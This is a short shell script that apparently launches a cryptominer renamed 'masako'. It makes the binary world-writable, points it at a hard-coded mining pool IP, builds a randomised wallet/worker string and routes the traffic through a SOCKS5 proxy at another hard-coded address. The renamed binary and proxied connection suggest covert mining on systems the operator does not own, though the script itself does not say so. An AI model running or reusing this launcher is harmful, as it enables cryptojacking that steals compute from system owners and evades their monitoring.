chmod 777 masako
POOL=128.199.88.243:1313
WALLET=masako.$(echo $(shuf -i 1-9999 -n 1)-PROXY)
WORKER=masako
PROXY=socks5://192.252.209.155:14455
./masako -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
